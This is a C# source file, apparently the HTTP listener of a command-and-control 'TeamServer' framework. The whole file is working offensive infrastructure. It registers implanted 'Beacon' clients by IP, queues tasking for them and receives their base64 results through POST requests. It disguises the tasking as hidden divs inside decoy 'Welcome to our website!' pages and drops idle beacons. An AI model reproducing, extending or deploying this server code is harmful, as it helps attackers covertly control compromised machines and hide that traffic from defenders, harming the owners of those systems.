using System;
using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using DataList.Beacon.Models;
using TeamServer.Beacon.Interface;
using TeamServer.Beacon.Models;
using TeamServer.HandlePacket;
using TeamServer.Data;
using DataList.Client.Models;
using TeamServer.Services;

namespace TeamServer.Listener
{
    /// <summary>
    /// HTTP请求数据
    /// </summary>
    internal class HttpRequestData
    {
        public string Method { get; set; }
        public string Path { get; set; }
        public string Version { get; set; }
        public Dictionary<string, string> Headers { get; set; } = new Dictionary<string, string>();
        public string Body { get; set; } = "";
    }

    /// <summary>
    /// HTTP监听器实现
    /// 支持HTTP GET/POST请求的Beacon通信
    /// </summary>
    internal class HttpListener : IListener
    {
        private readonly string _bindAddress;
        private readonly int _port;
        private TcpListener _tcpListener;
        private CancellationTokenSource? _cts;
        private Task? _listenTask;
        private Task? _cleanupTask;
        private readonly TimeSpan _cleanupInterval = TimeSpan.FromSeconds(30);
        private readonly TimeSpan _beaconIdleTimeout = TimeSpan.FromMinutes(5);

        // HTTP会话管理
        private readonly ConcurrentDictionary<string, BeaconHttpSession> _sessions = new();
        
        // 存储待发送给Beacon的数据
        private readonly ConcurrentDictionary<string, ConcurrentQueue<byte[]>> _pendingData = new();

        public HttpListener(string bindAddress, int port)
        {
            _bindAddress = bindAddress;
            _port = port;
        }

        public bool IsRunning { get; private set; }
        public string Protocol => "HTTP";
        public string BindAddress => _bindAddress;
        public int Port => _port;

        /// <summary>
        /// 新Beacon连接事件
        /// </summary>
        public event Action<IBeaconSession> OnBeaconConnected;

        /// <summary>
        /// Beacon断开连接事件
        /// </summary>
        public event Action<IBeaconSession> OnBeaconDisconnected;

        /// <summary>
        /// HTTP模式不处理Client，这里声明但不触发
        /// </summary>
        public event Action<ClientSession> OnClientConnected;
        public event Action<ClientSession> OnClientDisconnected;

        /// <summary>
        /// 错误事件
        /// </summary>
        public event Action<Exception> OnError;

        public async Task StartAsync()
        {
            if (IsRunning)
                return;

            try
            {
                LoggerService.Instance.Info($"启动HTTP监听器，绑定地址: {_bindAddress}:{_port}", "HttpListener", protocol: "HTTP");
                
                var bindIP = IPAddress.Parse(_bindAddress == "0.0.0.0" ? "0.0.0.0" : _bindAddress);
                _tcpListener = new TcpListener(bindIP, _port);
                _tcpListener.Start();
                
                _cts = new CancellationTokenSource();
                IsRunning = true;

                // 启动监听任务
                _listenTask = Task.Run(() => ListenLoop(_cts.Token));
                
                // 启动清理任务
                _cleanupTask = Task.Run(() => CleanupLoopAsync(_cts.Token));
                
                LoggerService.Instance.Success($"监听器已启动，监听地址: {_bindAddress}:{_port}", "HttpListener", protocol: "HTTP");
                
                await Task.CompletedTask;
            }
            catch (Exception ex)
            {
                LoggerService.Instance.Critical($"监听器启动失败: {ex.Message}", "HttpListener", ex, protocol: "HTTP");
                OnError?.Invoke(ex);
                throw;
            }
        }

        public async Task StopAsync()
        {
            if (!IsRunning)
                return;

            try
            {
                IsRunning = false;
                _cts?.Cancel();
                
                try 
                { 
                    _tcpListener?.Stop();
                    if (_listenTask != null) 
                        await _listenTask.ConfigureAwait(false); 
                } 
                catch { }
                
                try 
                { 
                    if (_cleanupTask != null) 
                        await _cleanupTask.ConfigureAwait(false); 
                } 
                catch { }
                
                LoggerService.Instance.Info("监听器已停止", "HttpListener", protocol: "HTTP");
            }
            catch (Exception ex)
            {
                LoggerService.Instance.Error($"监听器停止失败: {ex.Message}", "HttpListener", ex, protocol: "HTTP");
                OnError?.Invoke(ex);
                throw;
            }
        }

        private async Task ListenLoop(CancellationToken cancellationToken)
        {
            LoggerService.Instance.Debug("开始HTTP请求处理循环", "HttpListener", protocol: "HTTP");
            
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    var tcpClient = await _tcpListener.AcceptTcpClientAsync();
                    
                    // 异步处理请求，避免阻塞监听循环
                    _ = Task.Run(() => ProcessTcpClient(tcpClient), cancellationToken);
                }
                catch (ObjectDisposedException)
                {
                    LoggerService.Instance.Info("TCP监听器已关闭", "HttpListener", protocol: "HTTP");
                    break;
                }
                catch (Exception ex)
                {
                    if (!cancellationToken.IsCancellationRequested)
                    {
                        LoggerService.Instance.Error($"处理TCP连接异常: {ex.Message}", "HttpListener", ex, protocol: "HTTP");
                        OnError?.Invoke(ex);
                    }
                }
            }
        }

        private async Task ProcessTcpClient(TcpClient tcpClient)
        {
            NetworkStream stream = null;
            string clientIP = "unknown";
            try
            {
                stream = tcpClient.GetStream();
                clientIP = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
                
                // 读取HTTP请求
                var requestData = await ReadHttpRequest(stream);
                if (requestData == null)
                {
                    await SendHttpResponse(stream, 400, "Bad Request", "");
                    return;
                }
                
                LoggerService.Instance.Debug($"收到HTTP请求: {requestData.Method} {requestData.Path} 来源: {clientIP}", "HttpListener", clientIP: clientIP, protocol: "HTTP");
                
                if (requestData.Method == "GET")
                {
                    await HandleGetRequest(stream, clientIP, requestData);
                }
                else if (requestData.Method == "POST")
                {
                    await HandlePostRequest(stream, clientIP, requestData);
                }
                else
                {
                    await SendHttpResponse(stream, 404, "Not Found", "<html><body><h1>404 Not Found</h1></body></html>");
                }
            }
            catch (Exception ex)
            {
                LoggerService.Instance.Error($"处理TCP客户端异常: {ex.Message}", "HttpListener", ex, clientIP: clientIP, protocol: "HTTP");
                try
                {
                    if (stream != null)
                        await SendHttpResponse(stream, 500, "Internal Server Error", "");
                }
                catch { }
            }
            finally
            {
                try
                {
                    stream?.Close();
                    tcpClient?.Close();
                }
                catch { }
            }
        }

        private async Task<HttpRequestData> ReadHttpRequest(NetworkStream stream)
        {
            try
            {
                // 读取HTTP头部
                var headerBuffer = new List<byte>();
                var headerComplete = false;
                var buffer = new byte[1];
                
                // 逐字节读取直到找到 \r\n\r\n
                while (!headerComplete)
                {
                    var bytesRead = await stream.ReadAsync(buffer, 0, 1);
                    if (bytesRead == 0)
                        return null;
                    
                    headerBuffer.Add(buffer[0]);
                    
                    // 检查是否到达头部结束
                    if (headerBuffer.Count >= 4)
                    {
                        var lastFour = headerBuffer.GetRange(headerBuffer.Count - 4, 4).ToArray();
                        if (lastFour[0] == '\r' && lastFour[1] == '\n' && 
                            lastFour[2] == '\r' && lastFour[3] == '\n')
                        {
                            headerComplete = true;
                        }
                    }
                }
                
                var headerText = Encoding.UTF8.GetString(headerBuffer.ToArray());
                var lines = headerText.Split(new[] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
                
                if (lines.Length == 0)
                    return null;
                
                // 解析请求行
                var requestLine = lines[0].Split(' ');
                if (requestLine.Length < 3)
                    return null;
                
                var requestData = new HttpRequestData
                {
                    Method = requestLine[0],
                    Path = requestLine[1],
                    Version = requestLine[2]
                };
                
                // 解析头部
                for (int i = 1; i < lines.Length; i++)
                {
                    var colonIndex = lines[i].IndexOf(':');
                    if (colonIndex > 0)
                    {
                        var headerName = lines[i].Substring(0, colonIndex).Trim();
                        var headerValue = lines[i].Substring(colonIndex + 1).Trim();
                        requestData.Headers[headerName.ToLower()] = headerValue;
                    }
                }
                
                // 读取请求体（如果有Content-Length）
                if (requestData.Headers.TryGetValue("content-length", out var contentLengthStr) &&
                    int.TryParse(contentLengthStr, out var contentLength) && contentLength > 0)
                {
                    var bodyBuffer = new byte[contentLength];
                    var totalRead = 0;
                    
                    while (totalRead < contentLength)
                    {
                        var bytesRead = await stream.ReadAsync(bodyBuffer, totalRead, contentLength - totalRead);
                        if (bytesRead == 0)
                            break;
                        totalRead += bytesRead;
                    }
                    
                    requestData.Body = Encoding.UTF8.GetString(bodyBuffer, 0, totalRead);
                    LoggerService.Instance.Debug($"读取请求体，长度: {totalRead}，内容前50字符: {requestData.Body.Substring(0, Math.Min(50, requestData.Body.Length))}", "HttpListener", protocol: "HTTP");
                }
                
                return requestData;
            }
            catch (Exception ex)
            {
                LoggerService.Instance.Error($"解析HTTP请求异常: {ex.Message}", "HttpListener", ex, protocol: "HTTP");
                return null;
            }
        }

        private async Task SendHttpResponse(NetworkStream stream, int statusCode, string statusText, string body)
        {
            try
            {
                var response = $"HTTP/1.1 {statusCode} {statusText}\r\n" +
                              $"Content-Type: text/html; charset=utf-8\r\n" +
                              $"Content-Length: {Encoding.UTF8.GetByteCount(body)}\r\n" +
                              $"Connection: close\r\n" +
                              $"\r\n" +
                              body;
                
                var responseBytes = Encoding.UTF8.GetBytes(response);
                await stream.WriteAsync(responseBytes, 0, responseBytes.Length);
                await stream.FlushAsync();
            }
            catch (Exception ex)
            {
                LoggerService.Instance.Error($"发送HTTP响应异常: {ex.Message}", "HttpListener", ex, protocol: "HTTP");
            }
        }

        private async Task HandleGetRequest(NetworkStream stream, string clientIP, HttpRequestData request)
        {
            try
            {
                // GET请求用于Beacon获取待执行的任务
                var session = GetOrCreateSession(clientIP);
                session.Info.LastSeenTime = DateTime.UtcNow;

                // 检查是否有待发送的数据
                if (_pendingData.TryGetValue(clientIP, out var queue) && queue.TryDequeue(out var data))
                {
                    LoggerService.Instance.Debug($"发送数据到Beacon: {clientIP}，长度: {data.Length}", "HttpListener", clientIP: clientIP, protocol: "HTTP");
                    
                    // 将数据编码为Base64并包装在HTML中
                    var base64Data = Convert.ToBase64String(data);
                    var htmlResponse = $@"<!DOCTYPE html>
<html>
<head><title>Page</title></head>
<body>
<div id='content' style='display:none'>{base64Data}</div>
<p>Welcome to our website!</p>
</body>
</html>";
                    
                    await SendHttpResponse(stream, 200, "OK", htmlResponse);
                }
                else
                {
                    // 没有待发送数据，返回空页面
                    var emptyResponse = @"<!DOCTYPE html>
<html>
<head><title>Page</title></head>
<body>
<p>Welcome to our website!</p>
</body>
</html>";
                    await SendHttpResponse(stream, 200, "OK", emptyResponse);
                }
            }
            catch (Exception ex)
            {
                LoggerService.Instance.Error($"处理GET请求异常: {ex.Message}", "HttpListener", ex, clientIP: clientIP, protocol: "HTTP");
            }
        }

        private async Task HandlePostRequest(NetworkStream stream, string clientIP, HttpRequestData request)
        {
            try
            {
                // POST请求用于Beacon发送数据
                var session = GetOrCreateSession(clientIP);
                session.Info.LastSeenTime = DateTime.UtcNow;

                // 使用请求体中的数据
                var postData = request.Body;
                
                LoggerService.Instance.Debug($"收到POST数据，来源: {clientIP}，长度: {postData.Length}", "HttpListener", clientIP: clientIP, protocol: "HTTP");

                if (!string.IsNullOrEmpty(postData))
                {
                    try
                    {
                        // 尝试从Base64解码数据
                        var decodedData = Convert.FromBase64String(postData);
                        LoggerService.Instance.Debug($"解码后数据长度: {decodedData.Length}", "HttpListener", clientIP: clientIP, protocol: "HTTP");
                        
                        // 处理接收到的数据
                        ProcessIncomingData(clientIP, decodedData);
                    }
                    catch (FormatException)
                    {
                        LoggerService.Instance.Warning("POST数据不是有效的Base64格式", "HttpListener", clientIP: clientIP, protocol: "HTTP");
                    }
                }

                // 检查是否有待发送的数据，如果有则在响应中返回
                string responseBody;
                if (_pendingData.TryGetValue(clientIP, out var queue) && queue.TryDequeue(out var responseData))
                {
                    LoggerService.Instance.Debug($"POST响应中包含数据，长度: {responseData.Length}", "HttpListener", clientIP: clientIP, protocol: "HTTP");
                    
                    // 将数据编码为Base64并包装在HTML中
                    var base64Data = Convert.ToBase64String(responseData);
                    responseBody = $@"<!DOCTYPE html>
<html>
<head><title>Success</title></head>
<body>
<div id='content' style='display:none'>{base64Data}</div>
<p>Data received successfully!</p>
</body>
</html>";
                }
                else
                {
                    // 没有待发送数据，返回普通成功页面
                    responseBody = @"<!DOCTYPE html>
<html>
<head><title>Success</title></head>
<body>
<p>Data received successfully!</p>
</body>
</html>";
                }
                
                await SendHttpResponse(stream, 200, "OK", responseBody);
            }
            catch (Exception ex)
            {
                LoggerService.Instance.Error($"处理POST请求异常: {ex.Message}", "HttpListener", ex, clientIP: clientIP, protocol: "HTTP");
            }
        }

        private void ProcessIncomingData(string clientIP, byte[] data)
        {
            try
            {
                LoggerService.Instance.Debug($"处理接收数据，来源: {clientIP}，长度: {data.Length}", "HttpListener", clientIP: clientIP, protocol: "HTTP");
                
                var session = _sessions.GetOrAdd(clientIP, _ => CreateOrGetSession(clientIP));
                session.Info.LastSeenTime = DateTime.UtcNow;
                
                // 处理数据包
                BeaconPacketHandle.Read(data, session);
            }
            catch (Exception ex)
            {
                LoggerService.Instance.Error($"处理接收数据异常: {ex.Message}", "HttpListener", ex, clientIP: clientIP, protocol: "HTTP");
            }
        }

        private BeaconHttpSession GetOrCreateSession(string clientIP)
        {
            return _sessions.GetOrAdd(clientIP, _ => CreateOrGetSession(clientIP));
        }

        private BeaconHttpSession CreateOrGetSession(string clientIP)
        {
            LoggerService.Instance.Debug($"创建或获取会话，地址: {clientIP}", "HttpListener", clientIP: clientIP, protocol: "HTTP");
            
            var info = new BeaconInfo
            {
                Id = Guid.NewGuid().ToString("N"),
                ListenerId = Protocol,
                IPProt = $"{clientIP}:{_port}",
                IPAddress = clientIP,
                ConnectedTime = DateTime.UtcNow,
                LastSeenTime = DateTime.UtcNow,
            };
            
            var session = new BeaconHttpSession(
                async (data) => 
                {
                    // 将数据加入待发送队列
                    var queue = _pendingData.GetOrAdd(clientIP, _ => new ConcurrentQueue<byte[]>());
                    queue.Enqueue(data);
                    LoggerService.Instance.Debug($"数据已加入发送队列，目标: {clientIP}，长度: {data.Length}", "HttpListener", clientIP: clientIP, protocol: "HTTP");
                    await Task.CompletedTask;
                },
                () => 
                { 
                    _sessions.TryRemove(clientIP, out _);
                    _pendingData.TryRemove(clientIP, out _);
                },
                info);

            session.OnClosed += s =>
            {
                _sessions.TryRemove(clientIP, out _);
                _pendingData.TryRemove(clientIP, out _);
                OnBeaconDisconnected?.Invoke(s);
                LoggerService.Instance.Info($"会话已关闭: {clientIP}", "HttpListener", clientIP: clientIP, protocol: "HTTP");
            };

            OnBeaconConnected?.Invoke(session);
            LoggerService.Instance.Success($"HTTP Beacon会话已创建: {clientIP}", "HttpListener", clientIP: clientIP, protocol: "HTTP");
            return session;
        }

        private async Task CleanupLoopAsync(CancellationToken cancellationToken)
        {
            LoggerService.Instance.Debug("启动清理循环", "HttpListener", protocol: "HTTP");
            
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    CleanupStaleBeacons();
                }
                catch (Exception ex)
                {
                    LoggerService.Instance.Error($"清理Beacon异常: {ex.Message}", "HttpListener", ex, protocol: "HTTP");
                    OnError?.Invoke(ex);
                }

                try 
                { 
                    await Task.Delay(_cleanupInterval, cancellationToken).ConfigureAwait(false); 
                }
                catch (OperationCanceledException) 
                { 
                    LoggerService.Instance.Info("清理循环被取消", "HttpListener", protocol: "HTTP");
                    break; 
                }
            }
        }

        private void CleanupStaleBeacons()
        {
            var now = DateTime.UtcNow;
            
            // 快照全局列表，避免枚举修改
            IBeaconSession[] snapshot;
            lock (BeaconList.Beacons)
            {
                snapshot = BeaconList.Beacons.ToArray();
            }

            foreach (var beacon in snapshot)
            {
                // 仅清理HTTP会话
                if (!string.Equals(beacon.Info.ListenerId, this.Protocol, StringComparison.OrdinalIgnoreCase))
                {
                    continue;
                }

                var id = beacon.Info.Id;
                var lastSeen = beacon.Info.LastSeenTime;
                var missingInActiveMap = !_sessions.ContainsKey(beacon.Info.IPAddress);
                var timedOut = (now - lastSeen) > _beaconIdleTimeout;

                if (missingInActiveMap || timedOut)
                {
                    // 从全局列表移除
                    lock (BeaconList.Beacons)
                    {
                        BeaconList.Beacons.RemoveAll(b => b.Info.Id == id);
                    }
                    
                    // 发送断开通知
                    try 
                    { 
                        BeaconPacketHandle.SendBeaconDisconnectedNotification(beacon); 
                    } 
                    catch { }
                    
                    // 移除本地会话映射
                    _sessions.TryRemove(beacon.Info.IPAddress, out _);
                    _pendingData.TryRemove(beacon.Info.IPAddress, out _);
                    
                    OnBeaconDisconnected?.Invoke(beacon);
                    LoggerService.Instance.Info($"清理Beacon: {beacon.Info.IPProt}, missing={missingInActiveMap}, timeout={timedOut}", "HttpListener", clientIP: beacon.Info.IPProt, protocol: "HTTP");
                }
            }
        }
    }
}
